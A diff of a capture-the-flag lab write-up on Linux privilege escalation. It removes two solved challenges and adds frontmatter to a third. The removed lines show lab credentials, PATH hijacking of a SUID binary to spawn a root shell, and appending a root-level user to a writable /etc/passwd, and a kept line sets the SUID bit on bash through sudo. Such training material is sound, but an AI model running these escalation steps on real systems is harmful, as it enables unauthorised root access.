@@ -1,76 +1,9 @@
-# Lab 09 - Privilege Escalation
-
-| Drill Name | Port | Username | Password |
-| :--- | :--- | :--- | :--- |
-| **Maverick** | **2022** | `maverick` | `jXztBtEWKYRMrjAF` |
-| **Time** | **2023** | `time` | `EDBVCjNFAAzYedCX` |
-| **Writable** | **2024** | `jack` | `YvFWPeC7sTWJdaYQ` |
-
-# Maverick
-```bash
-ssh maverick@sss.upb -p 2022
-jXztBtEWKYRMrjAF
-```
-
-Lets look for files with SUID
-```bash
-maverick@maverick:~$ find / -perm -4000 2> /dev/null
-/usr/bin/newgrp
-/usr/bin/gpasswd
-/usr/bin/umount
-/usr/bin/mount
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/su
-/usr/bin/chsh
-/usr/bin/sudo
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/home/maverick/scripts/favorite-quote
-```
-
-favorite-quote looks interesting so we copy it to take a better look at it with ghidra
-```bash
-scp -P 2022 maverick@sss.upb:~/scripts/favorite-quote .
-```
-
-We see that it sets the uid and gid to 0, prints some text, and calls whoami, but without an abosulte path
-
-![hidra](../../../public/images/security_summer_school/09_privilege_escalation/maverick_ghidra.png)
-
-We can exploit this with PATH hijacking and making it run our own version of whoami
-
-1. Create a custom whoami script in /tmp that spawns a root shell
-```bash
-echo '#!/bin/bash' > /tmp/whoami
-echo '/bin/bash -p' >> /tmp/whoami   
-chmod +x /tmp/whoami
-```
-
-2. Prepend /tmp to PATH so our script is found first
-```bash
-export PATH=/tmp:$PATH
-```
-
-3. Run the SUID binary
-```bash
-/home/maverick/scripts/favorite-quote
-```
-
-Test it worked
-```bash
-root@maverick:~/scripts# id
-uid=0(root) gid=0(root) groups=0(root),1000(maverick)
-```
-
-Now we can read the flag
-```bash
-root@maverick:~/scripts# cd /root
-root@maverick:/root# ls
-flag.txt
-root@maverick:/root# cat flag.txt
-SSS{t00_m4ny_f4c3b00k_qu0t3s}
-```
+---
+Name: "Time"
+Category: "Security Summer School"
+Difficulty: "Easy"
+Description: "Escalating privileges by abusing delegated command execution and a writable cron script."
+---
 
 # Time
 ```bash
@@ -209,40 +142,3 @@ NOTE: We could have just used this command to solve it faster
 sudo -u wormhole /usr/bin/multitime /bin/bash -c 'echo "import os; os.system(\"chmod u+s /bin/bash\")" > /home/wormhole/time-travel.py'
 ```
 
-# Writable
-```bash
-ssh -p 2024 jack@sss.upb 
-YvFWPeC7sTWJdaYQ
-```
-
-The name of the challenge suggests we can write in an important file, after inspecting the machine we find out that the file is /etc/passwd
-```bash
-jack@writable:~$ ls -l /etc/passwd
--rw-r--rw- 1 root root 1320 Jul 24  2022 /etc/passwd
-```
-
-Lets generate the SHA-512 hash for our password
-```bash
-openssl passwd -6 -salt mysalt pass
-```
-
-Add a new entry
-```bash
-echo 'theo:$6$mysalt$xDOF4tdccs7ch7ng0lnbKQoqVd1ht2x0P3KQzWSZafhldlI65JsFSmlAAj9La8dikYU0LNkS1.gOL.54UCqPt/:0:0:root:/root:/bin/bash' >> /etc/passwd
-```
-
-Now we can switch to that user
-```bash
-jack@writable:~$ su theo
-Password:
-root@writable:/home/ubuntu# cd /root
-root@writable:~# ls
-flag.txt
-root@writable:~# cat flag.txt
-SSS{th1s_w4s_s0_wr1t4bl3}
-```
-
-> [!NOTE]
-> Had some issues with the inital connection, had to use
-> 
-> ssh -oKexAlgorithms=curve25519-sha256 -p 2024 jack@141.85.224.102
